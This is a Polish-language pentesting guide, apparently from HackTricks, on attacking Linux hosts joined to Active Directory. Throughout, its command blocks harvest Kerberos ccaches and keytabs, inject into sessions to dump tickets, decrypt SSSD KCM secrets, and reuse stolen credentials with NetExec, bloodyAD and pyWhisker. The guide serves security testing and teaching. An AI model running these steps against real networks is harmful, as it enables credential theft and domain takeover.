# Linux Active Directory

Maszyna Linux może również znajdować się w środowisku Active Directory.

Maszyna Linux w środowisku AD może **lokalnie przechowywać materiały Kerberos**: user ccaches, machine/service keytabs oraz sekrety zarządzane przez SSSD. Artefakty te można zazwyczaj ponownie wykorzystać jak każde inne poświadczenie Kerberos. Aby odczytać większość z nich, musisz być użytkownikiem będącym właścicielem biletu lub mieć uprawnienia **root** na maszynie.<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>

## Enumeracja

### Enumeracja AD z systemu Linux

Jeśli masz dostęp do AD z systemu Linux (lub do bash w systemie Windows), możesz użyć [https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn) do przeprowadzenia enumeracji AD.

Możesz również sprawdzić poniższą stronę, aby poznać **inne sposoby enumeracji AD z systemu Linux**:


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

### FreeIPA

FreeIPA to open-source’owa **alternatywa** dla Microsoft Windows **Active Directory**, przeznaczona głównie dla środowisk **Unix**. Łączy kompletny **katalog LDAP** z centrum dystrybucji kluczy MIT **Kerberos**, zapewniając zarządzanie podobne do Active Directory. Wykorzystując system **Certificate System** Dogtag do zarządzania certyfikatami CA i RA, obsługuje uwierzytelnianie **wieloskładnikowe**, w tym smart cards. SSSD jest zintegrowane na potrzeby procesów uwierzytelniania Unix.<sup>[[14]](#references)[[15]](#references)</sup> Dowiedz się więcej na ten temat:


{{#ref}}
../software-information/freeipa-pentesting.md
{{#endref}}

### Artefakty hosta dołączonego do domeny

Przed rozpoczęciem pracy z biletami ustal, **w jaki sposób host został dołączony do AD** i **gdzie faktycznie przechowywane są materiały Kerberos**. Na współczesnych hostach Linux jest to zazwyczaj obsługiwane przez `realmd` + `adcli` + `sssd`, a nie tylko przez zwykłe pliki w `/tmp`.<sup>[[10]](#references)</sup>
```bash
# Is the host joined to a realm/domain?
realm list 2>/dev/null
adcli testjoin 2>/dev/null

# SSSD / Kerberos configuration
grep -R "ad_domain\|krb5_realm\|cache_credentials\|ldap_id_mapping" /etc/sssd/sssd.conf /etc/sssd/conf.d 2>/dev/null
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null

# Machine account and local Kerberos artefacts
klist -k /etc/krb5.keytab 2>/dev/null
find /var/lib/sss -maxdepth 3 \( -name '*.ldb' -o -name '.secrets.mkey' -o -name 'ccache_*' \) -ls 2>/dev/null
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null
```
To szybko informuje, czy host ufa AD, czy SSSD buforuje identities lub tickets oraz czy dostępne są **machine/service keytabs** lub **KCM secrets**, które można wykorzystać.<sup>[[4]](#references)[[10]](#references)</sup>

## Praca z ticketami

### Pass The Ticket

Na tej stronie znajdziesz różne miejsca, w których możesz **znaleźć bilety Kerberos wewnątrz hosta Linux**. Na poniższej stronie dowiesz się, jak przekształcić te formaty ticketów CCache do formatu Kirbi (formatu potrzebnego do użycia w Windows), a także jak przeprowadzić atak PTT:


{{#ref}}
../../windows-hardening/active-directory-methodology/pass-the-ticket.md
{{#endref}}

Jeśli chcesz poznać **specyficzne dla Linuxa workflows związane z pozyskiwaniem ticketów** (`FILE`, `DIR`, `KEYRING`, `KCM`, `/proc` itd.), sprawdź dedykowaną stronę:

{{#ref}}
../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md
{{#endref}}

### Ponowne użycie ticketów CCACHE z /tmp

Pliki CCACHE to formaty binarne służące do **przechowywania credentials Kerberos**. `FILE:/tmp/krb5cc_%{uid}` jest nadal często używany, ale współczesne wdrożenia Linuxa korzystają również z `DIR:/run/user/%{uid}/krb5cc*`, `KEYRING:persistent:%{uid}` lub `KCM:%{uid}`. Sprawdź zmienną środowiskową **`KRB5CCNAME`** oraz ustawienie `default_ccache_name`, zanim założysz, że tickety znajdują się w `/tmp`.<sup>[[1]](#references)[[3]](#references)</sup>
```bash
# Where is the current process reading credentials from?
env | grep KRB5CCNAME
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null
klist -l 2>/dev/null

# FILE / DIR caches commonly seen on joined Linux hosts
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null

# Prepare to reuse a FILE cache
export KRB5CCNAME=/tmp/krb5cc_1000
klist
```
### Ponowne użycie ticketu CCACHE z keyringu

**Kerberos tickets przechowywane w pamięci procesu mogą zostać wyodrębnione**, szczególnie gdy ochrona ptrace na maszynie jest wyłączona (`/proc/sys/kernel/yama/ptrace_scope`). Przydatne narzędzie do tego celu znajduje się pod adresem [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey). Ułatwia ono ekstrakcję poprzez wstrzykiwanie do sesji i zrzucanie ticketów do `/tmp`.<sup>[[1]](#references)[[16]](#references)</sup>

Aby skonfigurować i używać tego narzędzia, wykonuje się poniższe kroki:
```bash
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release
/tmp/tickey -i
```
Ta procedura spróbuje wstrzyknąć kod do różnych sesji, wskazując powodzenie poprzez zapisanie wyodrębnionych ticketów w `/tmp` zgodnie z konwencją nazewnictwa `__krb_UID.ccache`.<sup>[[1]](#references)</sup>

### Ponowne użycie ticketów CCACHE z SSSD KCM

SSSD przechowuje kopię bazy danych w ścieżce `/var/lib/sss/secrets/secrets.ldb`. Odpowiedni klucz jest przechowywany jako ukryty plik w ścieżce `/var/lib/sss/secrets/.secrets.mkey`. Domyślnie klucz jest dostępny do odczytu tylko w przypadku posiadania uprawnień **root**.<sup>[[4]](#references)</sup>

Wywołanie **`SSSDKCMExtractor`** z parametrami --database i --key spowoduje przeanalizowanie bazy danych i **odszyfrowanie sekretów**.<sup>[[4]](#references)</sup>
```bash
git clone https://github.com/fireeye/SSSDKCMExtractor
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```
Extractor wyświetla surowe payloady JSON Kerberos; przed operacjami pass-the-cache/pass-the-ticket przekonwertuj je na użyteczny ticket cache lub inny format ticketu.<sup>[[4]](#references)</sup>

### Szybki triage keytabów
```bash
# Inspect available principals and enctypes
klist -k -e /etc/krb5.keytab

# Request a TGT directly from the keytab
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist
```
### Wyodrębnianie kont z /etc/krb5.keytab

Klucze kont usług, niezbędne dla usług działających z uprawnieniami root, są bezpiecznie przechowywane w plikach **`/etc/krb5.keytab`**. Klucze te, podobne do haseł usług, wymagają ścisłej poufności.<sup>[[5]](#references)</sup>

Do sprawdzenia zawartości pliku keytab można użyć **`klist`**. W systemie Linux polecenie `klist -k -K -e` wyświetla principal, numery wersji kluczy, typy szyfrowania oraz surowy materiał klucza. Jeśli typ klucza to **23 / RC4-HMAC**, jego wartość jest również **hashem NT** danego principal.<sup>[[6]](#references)[[17]](#references)</sup>
```bash
klist -k -K -e /etc/krb5.keytab
# RC4-HMAC entries expose reusable NTLM material; AES entries do not
```
Dla użytkowników Linux **`KeyTabExtract`** oferuje funkcje wyodrębniania hashy RC4 HMAC, które można wykorzystać do ponownego użycia hashy NTLM. Należy pamiętać, że jest to pomocne tylko wtedy, gdy keytab nadal zawiera materiał **etype 23 / RC4-HMAC**. W środowiskach **AES-only** możesz nie uzyskać możliwego do ponownego użycia hasha NT, ale nadal możesz uwierzytelniać się bezpośrednio za pomocą keytab przez Kerberos.<sup>[[5]](#references)[[6]](#references)[[7]](#references)</sup>
```bash
python3 keytabextract.py krb5.keytab
# Expected output varies based on hash availability
```
W systemie macOS **`bifrost`** służy jako narzędzie do analizy plików keytab.<sup>[[8]](#references)</sup>
```bash
./bifrost -action dump -source keytab -path /path/to/your/file
```
Wykorzystując wyodrębnione informacje o kontach i hashach, można nawiązywać połączenia z serwerami za pomocą narzędzi takich jak **`NetExec`**.<sup>[[9]](#references)</sup>
```bash
# NTLM/RC4 material recovered from etype 23 entries
nxc smb 10.XXX.XXX.XXX -u 'ServiceAccount$' -H "HashPlaceholder" -d "YourDOMAIN"

# Or reuse a Kerberos cache directly
KRB5CCNAME=owned.ccache nxc smb <DC_FQDN> --use-kcache
```
### Ponowne użycie konta komputera z `/etc/krb5.keytab`

W systemach dołączonych za pomocą `realmd`/`adcli`/`sssd` plik `/etc/krb5.keytab` zwykle zawiera **konto komputera** oraz jeden lub więcej **principalów hosta/usługi**. Jeśli masz **root**, nie zrzucaj go po prostu: użyj jednego z principalów wymienionych przez `klist -k`, aby zażądać TGT i działać jako sam host Linux.<sup>[[10]](#references)</sup>
```bash
# Identify usable principals first
klist -k /etc/krb5.keytab

# Then request a TGT with one of the listed principals
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist

# Validate LDAP / service access using that machine identity
ldapwhoami -Y GSSAPI -H ldap://dc.domain.local
kvno ldap/dc.domain.local
```
Jest to szczególnie przydatne, gdy sam **obiekt komputera** ma delegowane uprawnienia w AD lub gdy host może pobierać inne sekrety, takie jak **gMSA**.<sup>[[13]](#references)</sup>

### Ponowne użycie skradzionych materiałów Kerberos za pomocą narzędzi AD działających natywnie w Linux

Gdy masz prawidłowy `ccache` lub użyteczny keytab, możesz działać przeciwko AD **bezpośrednio z Linux**, bez wcześniejszego konwertowania wszystkiego do formatów Windows. Wiele nowoczesnych narzędzi natywnie obsługuje `KRB5CCNAME` / uwierzytelnianie Kerberos.<sup>[[9]](#references)[[11]](#references)[[12]](#references)</sup>
```bash
# Reuse a stolen cache with bloodyAD for LDAP-side actions
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local get object 'CN=Domain Admins,CN=Users,DC=corp,DC=local'

# Reuse the same cache with pyWhisker when you already have write access
KRB5CCNAME=owned.ccache python3 pywhisker.py -d corp.local -k --dc-ip dc.corp.local \
--target 'WEB01$' --action list
```
To dobre połączenie między **Linux post-exploitation** a **AD object abuse**. Jeśli chodzi o same ścieżki nadużycia na poziomie obiektów, sprawdź:

{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

{{#ref}}
../../windows-hardening/active-directory-methodology/acl-persistence-abuse/shadow-credentials.md
{{#endref}}

### Artefakty Linux gMSA / Managed Service Account

Nowsze wdrożenia Linux mogą bezpośrednio korzystać z **Managed Service Accounts** w AD. W praktyce oznacza to, że po przejęciu serwera Linux możesz znaleźć nie tylko host keytab, lecz także **service-specific keytabs** wygenerowane na podstawie gMSA. Typowe miejsca do sprawdzenia to `/etc/gmsad.conf`, pliki konfiguracyjne specyficzne dla wdrożenia oraz dodatkowe pliki `*.keytab` w katalogu `/etc`.<sup>[[2]](#references)[[13]](#references)</sup>
```bash
# Look for gMSA-related configuration and extra keytabs
grep -R "gMSA_\|principal =\|keytab =" /etc/gmsad.conf /etc/gmsad.d 2>/dev/null
find /etc -maxdepth 2 -name '*.keytab' -ls 2>/dev/null

# Inspect the host keytab and any service keytab you find
klist -kt /etc/krb5.keytab
klist -kt /etc/service.keytab

# If a service/gMSA keytab exists, request a TGT with it
kinit -kt /etc/service.keytab 'svc_web$@DOMAIN.LOCAL'
klist
```
Daje to możliwość wielokrotnego użycia tożsamości Kerberos dla SPN powiązanych z tym gMSA **bez dotykania żadnego endpointu Windows**.<sup>[[13]](#references)</sup> W przypadku nadużycia gMSA/dMSA po stronie **domain-side**, po uzyskaniu wyższych uprawnień w AD, sprawdź:

{{#ref}}
../../windows-hardening/active-directory-methodology/golden-dmsa-gmsa.md
{{#endref}}

## References

- [1] [Kerberos (II): Jak zaatakować Kerberos?](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [2] [Uzyskiwanie dostępu do AD za pomocą managed service account – bezpośrednia integracja systemów RHEL z Active Directory](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/integrating_rhel_systems_directly_with_windows_active_directory/assembly_accessing-ad-with-a-managed-service-account_integrating-rhel-systems-directly-with-active-directory)
- [3] [Zmienne środowiskowe Kerberos – dokumentacja MIT Kerberos](https://web.mit.edu/Kerberos/krb5-latest/doc/user/user_config/kerberos.html)
- [4] [SSSDKCMExtractor](https://github.com/mandiant/SSSDKCMExtractor)
- [5] [keytab – dokumentacja MIT Kerberos](https://web.mit.edu/kerberos/krb5-latest/doc/basic/keytab_def.html)
- [6] [RFC 4757: Typy szyfrowania RC4-HMAC Kerberos używane przez Microsoft Windows](https://www.rfc-editor.org/rfc/rfc4757)
- [7] [KeyTabExtract](https://github.com/sosdave/KeyTabExtract)
- [8] [bifrost](https://github.com/its-a-feature/bifrost)
- [9] [Korzystanie z Kerberos | NetExec](https://www.netexec.wiki/getting-started/using-kerberos)
- [10] [Wykrywanie i dołączanie do domen Identity | Red Hat Enterprise Linux](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html/windows_integration_guide/realmd-domain)
- [11] [Przewodnik użytkownika bloodyAD](https://github.com/CravateRouge/bloodyAD/wiki/User-Guide)
- [12] [pyWhisker](https://github.com/ShutdownRepo/pywhisker)
- [13] [gmsad](https://github.com/cea-sec/gmsad)
- [14] [Informacje | dokumentacja FreeIPA](https://www.freeipa.org/About.html)
- [15] [Informacje o wydaniu FreeIPA 4.11.0](https://www.freeipa.org/release-notes/4-11-0.html)
- [16] [Yama – dokumentacja Linux Kernel](https://docs.kernel.org/admin-guide/LSM/Yama.html)
- [17] [klist – dokumentacja MIT Kerberos](https://web.mit.edu/kerberos/krb5-current/doc/user/user_commands/klist.html)
{{#include ../../banners/hacktricks-training.md}}
